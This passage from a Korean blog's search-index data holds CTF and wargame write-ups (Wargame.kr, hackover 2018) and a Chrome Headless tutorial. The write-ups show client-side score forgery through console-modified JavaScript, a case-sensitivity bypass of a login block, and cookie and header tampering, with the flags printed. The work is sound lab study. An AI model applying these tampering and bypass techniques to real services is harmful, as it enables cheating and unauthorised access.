(bg_val &gt; 20) {        bg_val = 0    };    $('div#tunnel')['css']('background-position', '50% ' + bg_val + 'px');    if (ship_x + 32 &lt; 500) {        if (ship_x + 46 &lt; pos_x) {            ship_x += 4        } else {            if (ship_x + 16 &lt; pos_x) {                ship_x += 2            }        }    };    if (ship_x &gt; 0) {        if (ship_x - 14 &gt; pos_x) {            ship_x -= 4        } else {            if (ship_x + 16 &gt; pos_x) {                ship_x -= 2            }        }    };    $('img#ship')['css']('left', ship_x + 'px');    c_r++;    if (c_r &gt; 60) {        c_r = 0;        t_state = Math['floor'](Math['random']() * 2)    };    if (left_wall[0] &lt; 10) {        t_state = 1    } else {        if (right_wall[0] &gt; 470) {            t_state = 0        }    };    y = 0;    for (y = 20; y &gt; 0; y--) {        left_wall[y] = left_wall[y - 1];        right_wall[y] = right_wall[y - 1]    };    if (t_state == 0) {        left_wall[0] -= 3    };    if (t_state == 1) {        left_wall[0] += 3    };    right_wall[0] = left_wall[0] + BTunnelGame['widthTunnel']();    $('img.left_wall')['each'](function(_0x8618x16) {        $(this)['css']('left', '' + left_wall[_0x8618x16] + 'px')    });    $('img.right_wall')['each'](function(_0x8618x16) {        $(this)['css']('left', '' + right_wall[_0x8618x16] + 'px')    });    if (BTunnelGame['widthTunnel']() &gt;= 120) {        c_w++;        if (c_w &gt; 100) {            c_w = 0;            BTunnelGame['shrinkTunnel']();            left_wall[0] += 10        }    };    c_s++;    if (c_s &gt; 20) {        c_s = 0;        BTunnelGame.BincScore();        $('span#score')['text']('' + BTunnelGame['getScore']())    };    if (ship_x &lt;= left_wall[18] + 20 || ship_x + 32 &gt;= right_wall[18]) {        BTunnelGame['killPlayer']()    };    if (BTunnelGame['checkLife']()) {        setTimeout('updateTunnel()', 10)    } else {        $('img#ship')['fadeOut']('slow');        $('img.left_wall')['css']('display', 'none');        $('img.right_wall')['css']('display', 'none');        $['ajax']({            type: 'POST',            url: 'high-scores.php',            data: 'token=' + token + '&amp;score=' + BTunnelGame['getScore'](),            success: function(_0x8618x19) {                showHighScores(_0x8618x19)            }        })    }};function scoreUpdate() {    return};function showHighScores(_0x8618x19) {    $('div#score_table')['html'](_0x8618x19);    $('div#score_table')['css']('display', 'block')};$(document)['ready'](function() {    $('p#welcome')['css']('display', 'block');    updateToken();    setInterval('updateToken()', 10000);    $('p#welcome')['click'](function() {        $('p#welcome')['css']('display', 'none');        initTunnel();        updateTunnel()    });    $('#christian')['mouseover'](function() {        $(this)['html']('thx, Christian Montoya')    });    $('#christian')['mouseout'](function() {        $(this)['html'](temp)    })});var temp = 'Christian Montoya';$(document)['mousemove'](function(_0x8618x1d) {    pos_x = _0x8618x1d['pageX'] - rail_left});var token = '';function updateToken() {    $['get']('token.php', function(_0x8618x20) {        token = _0x8618x20    })};소스코드를 살펴보면 high-scores.php에 token과 score를 POST 방식으로 전송하는 부분을 찾을 수 있다.if (BTunnelGame['checkLife']()) {  setTimeout('updateTunnel()', 10)} else {  $('img#ship')['fadeOut']('slow');  $('img.left_wall')['css']('display', 'none');  $('img.right_wall')['css']('display', 'none');  $['ajax']({    type: 'POST',    url: 'high-scores.php',    data: 'token=' + token + '&amp;score=' + BTunnelGame['getScore'](),    success: function(_0x8618x19) {      showHighScores(_0x8618x19)    }  })}data: 부분을 보면 score의 값으로 BTunnelGame['getScore']() 함수의 결과를 전송 해 준다./* ... */var _0x8618x6 = 0;/* ... */function _0x8618x7() {  return _0x8618x6};/* ... */this['getScore'] = function() {  return _0x8618x7()};/* ... */function initTunnel() {    BTunnelGame = new secureGame();/* ... */}위의 부분을 살펴보면, BTunnelGame['getScore']() 함수는 현재 나의 점수를 의미한다는 것을 알 수 있다.때문에 만약 이 소스코드를 수정하여 BTunnelGame['getScore']() 대신에 31337의 값을 넣어준 후, 게임에서 죽으면 점수가 31337로 high-scores.php에 전송될 것이다.이를 테스트 해 보기 위해 소스코드를 모두 복사한 후 점수 전송 부분만 아래처럼 바꾸어서 Chrome 개발자도구의 Console에 입력 했다.if (BTunnelGame['checkLife']()) {  setTimeout('updateTunnel()', 10)} else {  $('img#ship')['fadeOut']('slow');  $('img.left_wall')['css']('display', 'none');  $('img.right_wall')['css']('display', 'none');  $['ajax']({    type: 'POST',    url: 'high-scores.php',    data: 'token=' + token + '&amp;score=' + 31337,    success: function(_0x8618x19) {      showHighScores(_0x8618x19)    }  })}위와 같이 Console 창에 입력한 후 게임을 플레이 하다가 죽으면 아래와 같이 flag를 얻을 수 있다.FLAG : D566E48378558D07CAFAF1564950482F29F64BAC ",
        "url": "//wargame/wargame.kr/2018/10/25/wargame.kr-fly_to_the_moon.html"
      }
      ,
    
      "wargame-wargame-kr-2018-10-24-wargame-kr-wtf-code-html": {
        "title": "[Wargame.kr] WTF_CODE 문제풀이",
        "tags": "Write-up, Wargame.kr",
        "date": "October 24, 2018",
        "author": "",
        "category": "",
        "content": "WFT_CODE 문제이다.이 문제는 뭔가 재미있는 문제였다.문제 정보는 다음과 같다.This is another programming language.Can you read this source code?홈페이지에 들어가면 아래와 같이 적혀 있고, source_code.ws라는 파일 하나를 다운받을 수 있다.이게 진짜 소스코드라고? 아무것도 안보인다고!!is this source code really???? i can`t see anything really!이 파일을 다운받으면 정말 아무것도 안보인다.그런데 드래그를 해 보면 아래와 같이 space와 tab으로만 이루어져 있다.뭔가 이걸로만 이루어진 프로그래밍 언어가 있을 것 같아서 이것저것 찾아보다가 아래의 블로그를 찾을 수 있었다.Whitespace Programming Language이런게 있다니 전혀 모르고 있었다.친절하게 Whitespace Programming Language 온라인 컴파일러의 링크까지 올려주었다.ideone.com여기에 들어가서 하단에서 Whitespace를 선택하고 문제의 소스코드를 복사&amp;붙여넣기 한 후 Run 버튼을 누르면 아래와 같은 결과를 얻을 수 있다.그리고 아래로 쭉 내려보면 실행 결과에서 flag를 얻을 수 있다.FLAG : 5b0f61f7d5810f35a0d27470e1e17e3929aa4936 ",
        "url": "//wargame/wargame.kr/2018/10/24/wargame.kr-WTF_CODE.html"
      }
      ,
    
      "wargame-wargame-kr-2018-10-23-wargame-kr-login-filtering-html": {
        "title": "[Wargame.kr] login filtering 문제풀이",
        "tags": "Write-up, Wargame.kr",
        "date": "October 23, 2018",
        "author": "",
        "category": "",
        "content": "매일 한 문제씩 푼다고 했는데 작심삼일도 못했다.갑자기 일이 많아져서 뭔가 여유가 없다.그래도 문제는 꾸준히 풀어야하니 오늘 잠깐 짬 났을때 하나 풀어 보았다.문제 정보는 다음과 같다.I have accounts. but, it's blocked.can you login bypass filtering?문제에 접속하면 로그인 화면이 하나 있고 소스코드를 볼 수 있게 되어있다.소스코드는 다음과 같다.&lt;?phpif (isset($_GET['view-source'])) {    show_source(__FILE__);    exit();}/*create table user( idx int auto_increment primary key, id char(32), ps char(32));*/ if(isset($_POST['id']) &amp;&amp; isset($_POST['ps'])){  include(\"../lib.php\"); # include for auth_code function.  mysql_connect(\"localhost\",\"login_filtering\",\"login_filtering_pz\");  mysql_select_db (\"login_filtering\");  mysql_query(\"set names utf8\");  $key = auth_code(\"login filtering\");  $id = mysql_real_escape_string(trim($_POST['id']));  $ps = mysql_real_escape_string(trim($_POST['ps']));  $row=mysql_fetch_array(mysql_query(\"select * from user where id='$id' and ps=md5('$ps')\"));  if(isset($row['id'])){   if($id=='guest' || $id=='blueh4g'){    echo \"your account is blocked\";   }else{    echo \"login ok\".\"&lt;br /&gt;\";    echo \"Password : \".$key;   }  }else{   echo \"wrong..\";  } }?&gt;&lt;!DOCTYPE html&gt;&lt;style&gt; * {margin:0; padding:0;} body {background-color:#ddd;} #mdiv {width:200px; text-align:center; margin:50px auto;} input[type=text],input[type=[password] {width:100px;} td {text-align:center;}&lt;/style&gt;&lt;body&gt;&lt;form method=\"post\" action=\"./\"&gt;&lt;div id=\"mdiv\"&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;ID&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"id\" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PW&lt;/td&gt;&lt;td&gt;&lt;input type=\"password\" name=\"ps\" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=\"2\"&gt;&lt;input type=\"submit\" value=\"login\" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; &lt;div&gt;&lt;a href='?view-source'&gt;get source&lt;/a&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;!--you have blocked accounts.guest / guestblueh4g / blueh4g1234ps--&gt;이 문제 풀면서 느낀건데 뭔가 난 아직 문제를 많이 안풀어봐서 그런건지, 아니면 센스가 부족한건지…다른 시각이 필요한데 그걸 잘 못본다 ㅠㅠ일단 처음에는 SQL Injection 문제인 줄 알았다.인터넷을 찾아보니 mysql_real_escape_string 함수를 bypass 할 수 있다는 글이 있어서 bypass 해서 다른 계정으로 로그인을 하면 되는 줄 알았다.그런데 등잔밑이 어둡다더니 취약점은 if 구문이었다.if 문을 살펴보면 다음과 같다.  if(isset($row['id'])){   if($id=='guest' || $id=='blueh4g'){    echo \"your account is blocked\";   }else{    echo \"login ok\".\"&lt;br /&gt;\";    echo \"Password : \".$key;   }  }else{   echo \"wrong..\";  }만약 쿼리를 실행 한 결과가 있다면, 해당 id가 guest 혹은 blueh4g 이라면 your account is blocked을 출력 해 준다.그런데 이 때, ==를 사용하며 비교 대상은 쿼리 결과로 나온 $row['id']가 아니라 내가 입력 한 $id이다.MySQL에서는 대소문자를 구분하지 않기 때문에 만약 내가 $id의 값으로 Guest를 입력 하더라도 id가 guest인 행을 얻어낼 수 있다.그렇지만 if($id=='guest' || $id=='blueh4g') 구문에서 $id는 내가 입력 한 Guest일 테니, 조건문에 들어가지 않을 수 있다.SQL Injection인 줄 알았는데!!!ID 자리에 Guest를, PW 자리에 guest를 입력하면 문제를 풀 수 있다.너무 허무하다… ㅠㅠFLAG : 9783333beeb385184e9def185bc99ec81d72254b",
        "url": "//wargame/wargame.kr/2018/10/23/wargame.kr-login_filtering.html"
      }
      ,
    
      "wargame-wargame-kr-2018-10-17-wargame-kr-qr-code-puzzle-html": {
        "title": "[Wargame.kr] QR CODE PUZZLE 문제풀이",
        "tags": "Write-up, Wargame.kr",
        "date": "October 17, 2018",
        "author": "",
        "category": "",
        "content": "세 번째 문제는 QR Code 문제이다.아 작년 어느 CTF에서 QR Code로 된 큐브 100개 맞췄던 기억이 나는 것 같다.문제 정보는 다음과 같다.javascript puzzle challengejust enjoy!문제에 접속하면 제목과 같이 QR Code Puzzle이 있다.이 퍼즐을 다 맞춰야 하는 것 같다.그렇지만 그 전에 먼저 소스코드를 확인 해 보았다.&lt;center&gt;&lt;script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js'&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"jquery.jqpuzzle.js\"&gt;&lt;/script&gt;&lt;script type='text/javascript' src='jquery.color-RGBa-patch.js'&gt;&lt;/script&gt;&lt;script type='text/javascript' src='jquery.blockUI.js'&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;/*&lt;![CDATA[*/ $(function(){ $('#join_img').attr('src',unescape('.%2f%69%6d%67%2f%71%72%2e%70%6e%67'));  $('#join_img').jqPuzzle({rows:6,cols:6,shuffle:true,numbers:false,control:false,style:{overlap:false}});  hide_pz();}); function hide_pz(){  var pz=$('#join_img div'); if(pz[pz.length-2]){$(pz[1]).remove();$(pz[pz.length-2]).remove();}else{setTimeout(\"hide_pz()\",5);} }/*]]&gt;*/&lt;/script&gt;&lt;style&gt;#join_img {padding:15px 15px 0 15px; border:2px solid #999; background-color:#444;}&lt;/style&gt;&lt;br /&gt;&lt;h1&gt;QR Code Puzzle&lt;/h1&gt;&lt;br /&gt;&lt;img id=\"join_img\" /&gt;&lt;br /&gt;지금 우리가 보는 퍼즐은 &lt;img id=\"join_img\"/&gt; 부분에서 보이고 있는 것 같다.그런데 위의 javascript 부분을 보면 #join_img 라고 되어 있고, 속성(attr)으로 'src' 다음에 또 다시 URL Encoding 된 문자가 있다.그래서 unescape() 함수 부분을 Chrome의 개발자 도구를 통해 실행시켜 보았다.unescape('.%2f%69%6d%67%2f%71%72%2e%70%6e%67')\"./img/qr.png\"그 결과 위와 같이 이미지의 경로가 나왔다.해당 경로로 이동 해 보니 잘리지 않은 원 상태의 QR Code를 발견할 수 있었다.이를 QR Code scanner라는 사이트에 읽게 하니 아래와 같이 flag의 위치를 찾을 수 있었다.FLAG : 80260bd3d5977a95d60a656c01be65de7a18d097",
        "url": "//wargame/wargame.kr/2018/10/17/wargame.kr-QR_CODE_PUZZLE.html"
      }
      ,
    
      "wargame-wargame-kr-2018-10-16-wargame-kr-flee-button-html": {
        "title": "[Wargame.kr] flee button 문제풀이",
        "tags": "Write-up, Wargame.kr",
        "date": "October 16, 2018",
        "author": "",
        "category": "",
        "content": "보안기사도 공부해야 하고 일도 해야하고 문제도 풀어야 하고 할 일이 너무 많다. ㅠㅠ그래도 하루에 한개 정도는 꾸준히 풀어야 하지 않을까 싶다 ㅎㅎ오늘은 flee button을 풀어보았다.문제 정보는 다음과 같다.click the button!i can't catch it!그리고 문제에 접속하면 아래와 같은 화면 한개가 나온다.저기 click me!라고 써진 버튼을 눌러야 하는 것 같은데 잡을수가 없다.계속 멀어지기만 한다.그래서 일단 페이지 소스보기(Ctrl + U)를 통해서 코드를 확인 해 보았다.&lt;title&gt;Just click it!&lt;/title&gt; &lt;style&gt; body {color:#fff; background-color:#000;}; &lt;/style&gt; &lt;script src=\"./p8.js\"&gt;&lt;/script&gt;&lt;body&gt;&amp;nbsp;&lt;/body&gt;&lt;script&gt;eval(unescape_blue14(\"%72%7d%71%85%7b%73%7c%84%34%87%82%77%84%73%2c%85%7c%73%83%71%6d%80%73%6b%70%7a%85%73%37%3a%2c%26%29%3a%3a%29%3d%38%29%3d%3d%29%40%3c%29%38%3a%29%3d%3d%29%3d%38%29%3a%3b%29%38%3c%29%3d%39%29%40%39%29%3d%37%29%38%3c%29%38%3a%29%40%39%29%40%3a%29%40%41%29%3d%6d%29%3d%39%29%3a%3b%29%38%3c%29%40%36%29%3d%72%29%40%39%29%3d%3d%29%40%3a%29%3d%3d%29%3d%72%29%3d%71%29%3a%38%29%3c%72%29%3d%36%29%40%39%29%3d%72%29%3d%6d%29%40%3b%29%40%3a%29%3d%39%29%3a%39%29%38%3c%29%3a%3c%29%3a%3a%29%3d%3d%29%3d%71%29%40%36%29%40%3b%29%40%3a%29%38%3a%29%40%3a%29%40%41%29%40%36%29%3d%39%29%3a%3b%29%38%3c%29%3d%36%29%40%3b%29%40%3a%29%40%3a%29%3d%72%29%3d%71%29%38%3c%29%38%3a%29%3d%72%29%3d%71%29%3d%3a%29%3d%72%29%3d%37%29%40%3b%29%40%39%29%3a%3b%29%38%3c%29%3d%71%29%3d%72%29%3d%41%29%40%36%29%38%71%29%38%72%29%3a%39%29%38%3c%29%38%3a%29%3d%72%29%3d%71%29%3d%37%29%3d%6d%29%3d%3d%29%3d%37%29%3d%41%29%3a%3b%29%38%3c%29%40%3d%29%3d%3d%29%3d%71%29%3d%38%29%3d%72%29%40%3d%29%39%3a%29%3d%6d%29%3d%72%29%3d%37%29%3c%72%29%40%3a%29%3d%3d%29%3d%72%29%3d%71%29%3a%3b%29%38%70%29%3a%3d%29%3d%41%29%3d%39%29%40%41%29%3a%3b%29%39%4C%29%39%40%29%39%4C%29%39%3C%29%38%70%29%3a%39%29%38%3c%29%38%3a%29%40%3c%29%3c%72%29%3d%6d%29%40%3b%29%3d%39%29%3a%3b%29%38%3c%29%3d%37%29%3d%6d%29%3d%3d%29%3d%37%29%3d%41%29%38%3a%29%3d%70%29%3d%39%29%38%3b%29%38%3c%29%3a%3c%29%3a%3a%29%39%3b%29%3d%38%29%3d%3d%29%40%3c%29%3a%3c%29%3a%3a%29%3d%3d%29%3d%71%29%40%36%29%40%3b%29%40%3a%29%38%3a%29%40%3a%29%40%41%29%40%36%29%3d%39%29%3a%3b%29%38%3c%29%40%3a%29%3d%39%29%40%40%29%40%3a%29%38%3c%29%38%3a%29%40%38%29%3d%39%29%3c%72%29%3d%38%29%3d%72%29%3d%71%29%3d%6d%29%40%41%29%38%3a%29%40%39%29%40%3a%29%40%41%29%3d%6d%29%3d%39%29%3a%3b%29%38%3c%29%40%3d%29%3d%3d%29%3d%38%29%40%3a%29%3d%3c%29%3a%38%29%39%41%29%39%70%29%39%3c%29%3a%39%29%38%3c%29%38%3a%29%3d%3d%29%3d%38%29%3a%3b%29%38%3c%29%3d%3c%29%3d%3d%29%3d%71%29%40%3a%29%38%3c%29%38%3a%29%40%3c%29%3c%72%29%3d%6d%29%40%3b%29%3d%39%29%3a%3b%29%38%3c%29%3d%38%29%3d%72%29%38%3a%29%40%41%29%3d%72%29%40%3b%29%38%3a%29%40%3d%29%3c%72%29%3d%71%29%40%3a%29%38%3a%29%40%3a%29%3d%72%29%38%3a%29%3d%40%29%3d%72%29%3d%3d%29%3d%71%29%3a%3d%29%38%3a%29%3d%37%29%3c%72%29%40%3a%29%3d%37%29%3d%3c%29%38%3a%29%3d%36%29%40%3b%29%40%3a%29%40%3a%29%3d%72%29%3d%71%29%39%38%29%38%3a%29%3d%3d%29%3d%3a%29%38%3a%29%40%41%29%3d%72%29%40%3b%29%38%3a%29%3d%37%29%3c%72%29%3d%71%29%38%3b%29%38%3c%29%3a%3c%26%2d%2d%43%7d%70%78%45%72%7d%71%85%7b%73%7c%84%34%75%73%84%4d%7a%73%7b%73%7c%84%4a%89%53%72%2c%26%73%83%71%26%2d%43%72%7d%71%85%7b%73%7c%84%34%7d%7c%7b%7d%85%83%73%7b%7d%86%73%45%73%83%71%72%77%86%43%72%7d%71%85%7b%73%7c%84%34%7d%7c%79%73%89%80%82%73%83%83%45%7c%7d%79%80%43%7d%70%78%34%83%84%89%7a%73%34%7a%73%74%84%45%33%38%36%36%43%7d%70%78%34%83%84%89%7a%73%34%84%7d%80%45%33%38%36%36%43%86%6d%82%24%77%45%36%32%6d%88%45%36%32%6d%89%45%38%36%36%32%83%87%45%37%32%82%45%38%36%36%43%72%7d%71%85%7b%73%7c%84%34%75%73%84%4d%7a%73%7b%73%7c%84%4a%89%53%72%2c%2b%73%83%71%2b%2d%34%83%84%89%7a%73%34%84%7d%80%45%33%3b%36%36%43%72%7d%71%85%7b%73%7c%84%34%7d%7c%71%7d%7c%84%73%88%84%7b%73%7c%85%45%7c%7d%79%80%43%72%7d%71%85%7b%73%7c%84%34%7d%7c%83%73%7a%73%71%84%83%84%6d%82%84%45%7c%7d%79%80%43%72%7d%71%85%7b%73%7c%84%34%7d%7c%72%82%6d%75%83%84%6d%82%84%45%7c%7d%79%80%43\"));&lt;/script&gt;&lt;script&gt;document.getElementById('hint').value=\"click button, if you want to get the authentication key\";&lt;/script&gt;script에서 eval() 함수를 통해서 어떤 코드를 실행시킨다.URL encoding이 되어 있는데, 이 값을 unescape_blue14() 함수에 한 번 실행시킨 후 eval() 함수를 호출한다.unescape_blue14() 함수는 p8.js 안에 정의되어 있다.javascript는 Chrome의 개발자 도구 콘솔 창에서 실행시킬 수 있기 때문에 개발자 도구를 통해서 함수를 실행시켜 보았다.실행 시키니 그림처럼 코드가 나온다.document.write(unescape_blue14(\"%44%72%77%86%24%77%72%45%26%73%83%71%26%24%83%84%89%7a%73%45%26%80%7d%83%77%84%77%7d%7c%42%6d%70%83%7d%7a%85%84%73%43%26%46%44%77%7c%80%85%84%24%84%89%80%73%45%26%70%85%84%84%7d%7c%26%24%7d%7c%74%7d%71%85%83%45%26%7c%7d%79%80%2c%2d%43%26%24%7d%7c%71%7a%77%71%79%45%26%87%77%7c%72%7d%87%34%7a%7d%71%6d%84%77%7d%7c%45%2b%47%79%73%89%45%3D%38%3D%36%2b%43%26%24%86%6d%7a%85%73%45%26%71%7a%77%71%79%24%7b%73%25%26%46%44%35%72%77%86%46%44%77%7c%80%85%84%24%84%89%80%73%45%26%84%73%88%84%26%24%82%73%6d%72%7d%7c%7a%89%24%83%84%89%7a%73%45%26%87%77%72%84%76%42%39%3b%36%43%26%24%77%72%45%26%76%77%7c%84%26%24%86%6d%7a%85%73%45%26%72%7d%24%89%7d%85%24%87%6d%7c%84%24%84%7d%24%78%7d%77%7c%47%24%71%6d%84%71%76%24%70%85%84%84%7d%7c%32%24%77%74%24%89%7d%85%24%71%6d%7c%25%26%46\"));obj=document.getElementById(\"esc\");document.onmousemove=escdiv;document.onkeypress=nokp;obj.style.left=-200;obj.style.top=-200;var i=0,ax=0,ay=200,sw=1,r=200;document.getElementById('esc').style.top=-500;document.oncontextmenu=nokp;document.onselectstart=nokp;document.ondragstart=nokp;아래는 javascript 코드인데 위에는 또 다시 unescape_blue14() 함수를 호출한다.그래서 얘를 또 다시 콘솔 창에서 실행을 시켜 보았다.&lt;div id=\"esc\" style=\"position:absolute;\"&gt;&lt;input type=\"button\" onfocus=\"nokp();\" onclick=\"window.location='?key=7270';\" value=\"click me!\"&gt;&lt;/div&gt;&lt;input type=\"text\" readonly style=\"width:350;\" id=\"hint\" value=\"do you want to join? catch button, if you can!\"&gt;그랬더니 위와 같은 html 코드가 나왔다.여기서 주의깊게 봐야 하는 부분은 &lt;input type=\"button\" onfocus=\"nokp();\" onclick=\"window.location='?key=7270';\" value=\"click me!\"&gt;이다.이 부분이 눌러야 하는 button 부분인데, onclick() 메소드를 통해서 만약 버튼이 눌릴 경우 특정 위치로 이동하라고 나와있다.이동할 페이지가 적혀 있으므로 그냥 이 경로로 이동하면 문제가 풀릴 것 같다.역시 문제를 풀 수 있었다.FLAG : c5339924895c8a7c774edab2d4bb396be09aea1d",
        "url": "//wargame/wargame.kr/2018/10/16/wargame.kr-flee_button.html"
      }
      ,
    
      "wargame-wargame-kr-2018-10-15-wargame-kr-already-got-html": {
        "title": "[Wargame.kr] already got 문제풀이",
        "tags": "Write-up, Wargame.kr",
        "date": "October 15, 2018",
        "author": "",
        "category": "",
        "content": "이번엔 Wargame.kr이 리뉴얼 되서 재오픈 했다.그래서 이제 Wargame.kr을 천천히 정복해 보려고 한다.첫 번째 문제는 already got이다.문제 정보는 다음과 같다.can you see HTTP Response header?HTTP Response header를 보면 되는 문제인 것 같다.문제 페이지에 접속하면 정말 아무것도 없다.그냥 you've already got key! :p라고만 나온다.아까 디스크립션에서 HTTP Response header를 보라고 했으니, Restlet 확장 프로그램을 이용해서 HTTP Response를 확인 해 보았다.그랬더니 아래와 같이 손쉽게 플래그를 얻을 수 있었다.FLAG : 5d3b4c838ded08c2c0874bbc7884ac96be6cb536",
        "url": "//wargame/wargame.kr/2018/10/15/wargame.kr-already_got.html"
      }
      ,
    
      "ctf-2018-2018-10-07-ctf-hackover2018-i-love-heddha-html": {
        "title": "[hackover 2018] i-love-heddha Write up",
        "tags": "Write-up, CTF, hackover2018",
        "date": "October 7, 2018",
        "author": "",
        "category": "",
        "content": "주말에 잠시잠깐 짬을 내서 hackover라는 CTF에 참가했다.그 중에 하나를 풀긴 했는데…Write-up을 쓸까말까 고민 하다가 요즘 포스팅이 너무 뜸했어서 올린다. ㅎㅎ문제 정보는 다음과 같다.i-love-heddhaA continuation of the Ez-Web challenge. enjoy207.154.226.40:8080이거 이 전에 나온 ez web이란 문제의 2번째 버전이다.문제 서버에 접속하면 아래처럼 under construction 이라고만 나오고 아무것도 안나온다.소스보기를 하면 /under_construction.gif가 있는데, 이걸 누르면 아래와 같은 오류가 나온다.찾아보니 이건 spring boot라는 걸로 구현하면 저렇게 오류를 뱉어준다고 한다.일단 뭔가 단서를 찾아야 하니 robots.txt를 찾아 보았다.그랬더니 아래처럼 /flag/라는 디렉토리가 있는 것을 알 수 있었다.User-agent: * Disallow: /flag/이 경로에 접속 해 보면 flag.txt가 있다.근데 얘를 그냥 누르면 flga.txt로 이동해서 없다고 나온다.오타인지 의도한건지…얘를 다시 경로를 flag.txt로 바꿔서 이동 해 주면 Bad luck buddy라고 나온다.여기서 쿠키를 확인하면 아래처럼 isAllowed가 있는데, 값이 false로 되어 있다.그러면 이 쿠키 값을 true로 바꿔 주면 문제가 뙇! 하고 풀릴 것 같은데 이건 이 전의 문제 ez web의 풀이법이다.일단 true로 바꿔주고 다시 보면 이번에는 You are using the wrong browser, 'Builder browser 1.0.1' is required 라고 한다.헤더를 조작해야 하는 것 같다.그래서 Burp Suite로 잡아서 User-Agent를 Builder browser 1.0.1로 변경 해 주었다.그랬더니 이번에는 You are refered from the wrong location hackover.18 would be the correct place to come from. 란다.그래도 title이 Almost인 것을 보니 이것만 해결하면 문제가 풀리는 것 같다.다시 Burp Suite로 잡아서 아까처럼 User-Agent는 Builder browser 1.0.1로 바꾸고, Referer라는 것을 추가 해 hackover.18로 만들어 주었다.드디어! flag 처럼 보이는 것을 찾을 수 있었다.딱 봐도 base64로 인코딩 되어있는 것 같으니, 얘를 https://www.base64decode.org/로 들어가서 디코딩 해 주었다.그 결과 아래와 같이 flag를 찾을 수 있었다.이제 다른 문제 풀러 가야지~FLAG : hackover18{4ngryW3bS3rv3rS4ysN0}",
        "url": "//ctf/2018/2018/10/07/ctf-hackover2018-i-love-heddha.html"
      }
      ,
    
      "development-web-2018-09-29-chrome-headless-html": {
        "title": "[Chrome] Chrome Headless 사용법",
        "tags": "chrome, headless",
        "date": "September 29, 2018",
        "author": "",
        "category": "",
        "content": "하는 일이 일이다보니 크고작은 CTF용 문제를 낼 일이 많다.그런데 XSS 문제를 낼 때마다 고민인게, 참가자들이 문제를 제대로 풀었다는 것을 어떻게 검증하느냐 이다.그러다 Chrome Headless라는 것을 알게 되어 정리해 두려 한다.Chrome Headless 란Chrome Headless는 쉽게 이야기 하면 Chrome 브라우저를 GUI 없이 사용할 수 있는 모드이다.윈도우 기준으로는 Chrome 59, 맥/리눅스 기준으로는 Chrome 60 버전부터 정식으로 추가되어 사용할 수 있다.실제 브라우저와 동일하게 작동해서 Javascript도 실행할 수 있다.다른 사람들은 크롤링을 할 때 사용하는 것 같은데, 나는 창을 따로 띄우지 않고 Javascript를 실행할 수 있다는 점을 이용 해 XSS 문제 낼 때 사용했다.내가 사용한 서버는 Ubuntu 16.04이고, Chrome 브라우저를 사용하기는 어려워 chromedriver를 사용했다.Chrome Headless 사용하기환경 세팅하기Ubuntu에서 Chrome Headless를 사용하기 위해서 몇 가지 환경 세팅이 필요하다.1. python 설치하기$ apt-get install python2.7$ apt-get install python-pip python-dev python-setuptools$ pip install --upgrade pip2. Chrome Headless를 사용하기 위한 툴 및 모듈 설치$ pip install selenium$ apt-get install chromium-browserpip install selenium을 할 때 아래와 같은 에러가 발생하는 경우가 있다.importError: cannot import name 'main'이 때는 hash -d pip를 해 주면 더 이상 에러가 발생하지 않는다.이 후, Ubuntu에서 Chrome 브라우저 대신 사용 할 chromedriver를 다운받아야 한다.chromedriver 다운로드위의 사이트에서 자신의 서버 버전에 맞는 chromedriver를 다운받은 후, 압축을 풀어 서버에 옮겨두면 된다.만약 리눅스 환경이라면, 아래의 명령어를 입력 해 실행 권한을 주어야 한다.$ chmod +x chromedriver여기까지 하면 Chrome Headless를 사용하기 위한 환경 세팅이 끝난다.코드 구현하기가장 기본적인 형태의 코드는 다음과 같다.from selenium import webdriverdriver = webdriver.Chrome('./chromedriver')driver.get('http://google.com')driver.quit()이 때, webdriver.Chrome() 안에는 다운받은 chromedriver의 경로를 적어주어야 한다.그런데 내 경우에는 이렇게만 구현하면 또 에러가 발생했다.이에 아래와 같이 옵션을 넣어주면 정상적으로 동작했다.from selenium import webdriverchrome_options = webdriver.ChromeOptions()chrome_options.add_argument(\"--headless\")chrome_options.add_argument(\"--no-sandbox\")chrome_options.add_argument(\"--disable-dev-shm-usage\")driver = webdriver.Chrome(\"./chromedriver\", chrome_options = chrome_options)driver.get('http://google.com')driver.quit()여기에서 만약 캡쳐를 하고 싶다면 캡쳐하는 코드를, PDF로 받고 싶다면 PDF로 받는 코드를 구현하면 된다.아래는 접속한 화면을 캡쳐 해 screenshot.png로 저장하는 코드이다.from selenium import webdriverchrome_options = webdriver.ChromeOptions()chrome_options.add_argument(\"--headless\")chrome_options.add_argument(\"--no-sandbox\")chrome_options.add_argument(\"--disable-dev-shm-usage\")driver = webdriver.Chrome(\"./chromedriver\", chrome_options = chrome_options)driver.get('http://google.com')driver.get_screenshot_as_file('screenshot.png')driver.quit()여기까지가 기본적인 사용법이다.언어가 python이기 때문에 자신이 원하는 사용처에 따라서 추가적인 코드를 구현 해 사용하면 된다.나는 그냥 대회 운영용으로 사용했는데, 다른 사람들이 사용 한 것처럼 웹 크롤러로 쓴다던지, 사용처가 매우 무궁무진 할 것 같다.아직은 짧은 코드만 구현 해 겉핥기 식으로 사용해 봤는데, 시간이 날 때 다른 방향으로 좀 더 사용 해 봐야겠다.",
        "url": "//development/web/2018/09/29/chrome-headless.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-09-19-los-alien-html": {
        "title": "[Lord of SQL Injection] LoS - alien 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "September 19, 2018",
        "author": "",
        "category": "",
